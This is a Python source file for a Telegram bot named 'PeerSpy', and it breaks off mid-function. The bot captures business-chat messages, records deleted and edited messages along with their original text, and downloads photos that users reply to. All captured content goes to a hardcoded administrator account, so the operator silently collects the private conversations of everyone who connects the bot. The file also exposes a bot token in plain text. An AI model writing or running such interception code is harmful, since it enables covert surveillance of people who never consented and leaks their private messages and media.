import os
import asyncio
import aiohttp
import logging
import sqlite3
from flask import Flask
from threading import Thread
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext

# --- НАСТРОЙКИ ---
TOKEN = "8758417597:AAERQH3jUuduK8syNtCKW8tvHdZXTilJrF8"
ADMIN_ID = 6451702799 

# --- БАЗА ДАННЫХ ---
def init_db():
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute('''CREATE TABLE IF NOT EXISTS messages 
                   (msg_id TEXT PRIMARY KEY, user_id TEXT, text TEXT)''')
    cur.execute('''CREATE TABLE IF NOT EXISTS users 
                   (user_id INTEGER PRIMARY KEY, username TEXT, join_date TEXT)''')
    conn.commit()
    conn.close()

def add_user(user_id, username):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?)", 
                (user_id, username, str(datetime.now())))
    conn.commit()
    conn.close()

# --- БУДИЛЬНИК ---
app = Flask('')
@app.route('/')
def home(): return "PeerSpy System Active"

def run_web():
    app.run(host='0.0.0.0', port=os.environ.get("PORT", 8080))

# --- ЛОГИКА БОТА ---
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

class AdminStates(StatesGroup):
    waiting_for_broadcast = State()

def main_menu(user_id):
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="📖 Как подключить?", callback_data="help"))
    builder.row(types.InlineKeyboardButton(text="📈 Мой профиль", callback_data="profile"))
    if user_id == ADMIN_ID:
        builder.row(types.InlineKeyboardButton(text="⚙️ Админ-панель", callback_data="admin_panel"))
    return builder.as_markup()

@dp.message(Command("start"))
async def start(message: types.Message):
    add_user(message.from_user.id, message.from_user.username)
    await message.answer(f"🚀 <b>PeerSpy v3.2</b> активен.\n\nОтветь на любое сообщение в бизнес-чате, чтобы активировать перехват.", reply_markup=main_menu(message.from_user.id))

# --- АДМИНКА ---
@dp.callback_query(F.data == "admin_panel")
async def admin_panel(c: types.CallbackQuery):
    if c.from_user.id != ADMIN_ID: return
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*) FROM users")
    count = cur.fetchone()[0]
    conn.close()
    
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="📢 Сделать рассылку", callback_data="broadcast"))
    await c.message.answer(f"<b>⚙️ Админка</b>\n\nЮзеров в базе: <b>{count}</b>", reply_markup=builder.as_markup())
    await c.answer()

@dp.callback_query(F.data == "broadcast")
async def start_broadcast(c: types.CallbackQuery, state: FSMContext):
    await c.message.answer("Введите текст для рассылки:")
    await state.set_state(AdminStates.waiting_for_broadcast)
    await c.answer()

@dp.message(AdminStates.waiting_for_broadcast)
async def do_broadcast(message: types.Message, state: FSMContext):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute("SELECT user_id FROM users")
    users = cur.fetchall()
    conn.close()
    
    count = 0
    for user in users:
        try:
            await bot.send_message(user[0], message.text)
            count += 1
        except: continue
    await message.answer(f"✅ Рассылка завершена! Получили: {count} чел.")
    await state.clear()

# --- БИЗНЕС-ЛОГИКА (ИСПРАВЛЕННЫЙ СИНТАКСИС) ---

# 1. Все входящие бизнес-сообщения
@dp.business_message()
async def business_handler(message: types.Message):
    # Сохраняем текст в базу
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    msg_text = message.text or message.caption or "[Медиа]"
    cur.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?)", 
                (str(message.message_id), str(message.from_user.id), msg_text))
    conn.commit()
    conn.close()

    # Перехват фото через ответ (REPLY)
    if message.reply_to_message and message.reply_to_message.photo:
        f_id = message.reply_to_message.photo[-1].file_id
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={f_id}") as resp:
                data = await resp.json()
                if data.get("ok"):
                    path = data["result"]["file_path"]
                    async with session.get(f"https://api.telegram.org/file/bot{TOKEN}/{path}") as f_resp:
                        content = await f_resp.read()
                        await bot.send_photo(ADMIN_ID, types.BufferedInputFile(content, filename="saved.jpg"), 
                                             caption="🛡 <b>Файл спасен!</b>")

# 2. Удаленные сообщения (Используем универсальный регистратор)
@dp.business_deleted_messages()
async def on_delete(event: types.BusinessMessagesDeleted):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    for m_id in event.message_ids:
        cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(m_id),))
        res = cur.fetchone()
        if res:
            await bot.send_message(ADMIN_ID, f"🗑 <b>Удалено:</b>\n{res[0]}")
    conn.close()

# 3. Измененные сообщения
@dp.business_edited_message()
async def on_edit(message: types.Message):
    conn = sqlite3.connect('bot_data.db')
    cur = conn.cursor()
    cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(message.message_id),))
    old = cur.fetchone()
    new_text = message.text or "[Медиа]"
    if old:
        await bot.send_message(ADMIN_ID, f"✏️ <b>Изменено:</b>\n<b>Было:</b> {old[0]}\n<b>Стало:</b> {new_text}")
    conn.close()

@dp.callback_query(F.data == "help")
async def help_cb(
